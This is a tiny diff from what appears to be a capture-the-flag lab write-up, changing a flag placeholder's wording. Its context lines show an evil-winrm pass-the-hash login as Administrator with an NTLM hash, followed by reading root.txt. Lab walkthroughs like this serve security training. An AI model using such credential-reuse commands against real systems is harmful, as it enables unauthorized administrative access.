@@ -355,7 +355,7 @@ evil-winrm -i 10.129.34.95 -u Administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e
 Evil-WinRM shell v3.9
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-[flag root]
+[root flag]
 ```
 
 ---
